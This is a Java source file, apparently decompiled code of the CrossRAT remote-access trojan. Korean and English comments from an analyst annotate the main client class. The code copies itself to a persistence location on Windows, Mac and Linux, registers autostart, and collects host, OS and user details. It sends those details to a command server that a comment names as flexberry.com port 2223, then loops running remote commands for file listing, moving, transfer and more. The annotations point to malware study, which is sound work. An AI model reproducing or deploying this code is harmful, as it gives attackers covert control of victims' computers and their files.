package crossrat;

import java.awt.*;
import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URLDecoder;
import java.util.UUID;
import java.util.prefs.Preferences;

public class client {
    public static void main(String[] var0) {
        a.a var15 = a.c.b();
        String var1 = "java.io.tmpdir";
        var1 = System.getProperty("java.io.tmpdir");
        // var2: crossRAT이 실행된 위치
        String var2 = URLDecoder.decode(client.class.getProtectionDomain().getCodeSource().getLocation().getPath(), "UTF-8");
        File var20 = new File(var2);
        k.K = "";
        String var16;
        if (var15.a() == a.c.a) {
            k.K = var1 + "\\"; // 윈도우인 경우: java.io.tmpdir 즉 임시 디렉토리의 경로를 가져온다.
        } else if (var15.a() == a.c.b) {
            var16 = System.getProperty("user.home");
            k.K = var16 + "/Library/"; // Mac인 경우: home directory의 라이브러리 폴더의 경로를 가져온다.
        } else {
            k.K = "/usr/var/"; // Linux인 경우: /usr/var
        }

        File var17 = new File(k.K + "mediamgrs.jar"); // OS별로 다른 적절한 폴더에 이 파일을 가리키는 File 객체

        try {
            // var20: 실행된 위치, var17: 위에서 정한 적절한 폴더
            // 아마도 var20을 var17로 복사하는 함수인 듯 하다.
            org.a.a.a.b.a(var20, var17);
        } catch (Exception var11) {
            var11.printStackTrace();
        }

        try {
            String var10001 = var17.toString();
            boolean var18 = true;
            String var7 = var10001;
            var16 = "mediamgrs";
            a.a var8;
            Object var19;

            // 변수 3개로 var19를 초기화
            if ((var8 = a.c.b()).a() == a.c.a) {
                var19 = new b.e(var16, var7, true); // 윈도우
            } else if (var8.a() == a.c.b) {
                var19 = new b.c(var16, var7, true); // Mac
            } else if (var8.d() && !GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance()) {
                var19 = new b.d(var16, var7, true); // Linux
            } else {
                if (!var8.d()) {
                    throw new RuntimeException("Unknown operating system " + var8.c());
                }

                var19 = new b.b(var16, var7, true);
            }

            ((b.a) var19).a();
        } catch (Exception var14) {
            var14.printStackTrace();
        }

        if ((k.g = (k.h = Preferences.userRoot()).get("UID", (String) null)) == null) {
            k.g = (k.f = UUID.randomUUID()).toString();
            k.h.put("UID", k.g);
        }

        // 유저 정보 (var3에 저장)
        var1 = System.getProperty("os.name");
        var2 = System.getProperty("os.version");
        var16 = System.getProperty("user.name");
        String var3 = InetAddress.getLocalHost().getHostName();
        var3 = var16 + "^" + var3;

        while (true) {
            try {
                while (true) {
                    Socket var4;
                    (var4 = new Socket(k.b, k.c)).setSoTimeout(120000); // k.b: "flexberry.com", k.c: 2223
                    k.k = var4; // Socket k
                    // k.g와 k.h는 위에서 __를 넣음
                    // k.m ~ k.z, k.A ~ k.J: @0000 ~ @0009, @0000 ~ @0013
                    // k.d: $#@ -> 파싱용인듯
                    // Preferences.userRoot().get("UID", (String)null)$#@@0000$#@[Host의 IP주소]$#@[OS 이름]$#@[OS버젼]$#@[User name]^Local Host의 Host name]$#@0.1$#@GROUP2$#@&&&
                    (new DataOutputStream(var4.getOutputStream())).writeBytes(k.g + k.d + k.w + k.d + e.b() + k.d + var1 + k.d + var2 + k.d + var3 + k.d + k.i + k.d + k.j + k.d + "&&&");
                    // 위에서 쏘고 다시 무언가를 받는다.
                    BufferedReader var5 = new BufferedReader(new InputStreamReader(var4.getInputStream()));
                    PrintStream var6 = new PrintStream(var4.getOutputStream(), true);

                    try {
                        while (true) {
                            var16 = var5.readLine(); // 받은 것은 읽어서 var16에 담는다.

                            try {
                                String[] var21;
                                // k.d 즉, $#@으로 파싱한다.
                                // 서버로부터 명령을 받은 대로 실행한다.
                                if ((var21 = var16.split("\\" + k.d))[0].equals(k.m)) { // @0000
                                    new e();
                                    e.a();
                                    (new f()).start();
                                } else if (var21[0].equals(k.n)) { // @0001
                                    // send file list of path "var21[1]\" to server
                                    (new c(var21[1])).start();
                                } else if (var21[0].equals(k.o)) {  // @0002
                                    // make directory that's full path is "var21[1]"
                                    /*
                                     * this function will send server some code
                                     * 0: failed due to security exception
                                     * 1: succeeded
                                     * 2: already exist
                                     */
                                    (new a(var21[1])).start();
                                } else if (var21[0].equals(k.p)) {  // @0003
                                    (new b(var21[1], var21[2])).start();
                                } else if (var21[0].equals(k.q)) {
                                    // mv var21[1] to var21[2], don't care wheater this is file or dir
                                    /*
                                     * ex in linux) mv "var21[1]" "var21[2]"
                                     * 0: failed due to security exception
                                     * 1: succeeded
                                     * 2: var21[2] is already existing
                                     */
                                    (new h(var21[1], var21[2])).start();
                                } else if (var21[0].equals(k.r)) {
                                    (new d(k.b, k.c, var21[1], var21[2], var21[3], "0")).start();
                                } else if (var21[0].equals(k.s)) {
                                    (new d(k.b, k.c, var21[1], var21[2], var21[3], "1")).start();
                                } else if (var21[0].equals(k.t)) {
                                    // send random UID to server
                                    // "(random UID) + $#@ + @0001 + $#@ + &&&"
                                    (new g()).start();
                                } else if (var21[0].equals(k.u)) {
                                    (new j(k.b, k.c)).start();
                                } else if (var21[0].equals(k.v)) {
                                    (new i(var21[1])).start();
                                }
                            } catch (Exception var10) {
                                ;
                            }
                        }
                    } catch (Exception var12) {
                        System.out.println("ERROR");
                        var4.close();
                        var6.close();
                        var5.close();
                        var5.close();
                        var6.close();
                        var4.close();
                    }
                }
            } catch (Exception var13) {
                try {
                    Thread.sleep(5000L);
                } catch (InterruptedException var9) {
                    ;
                }
            }
        }
    }
}
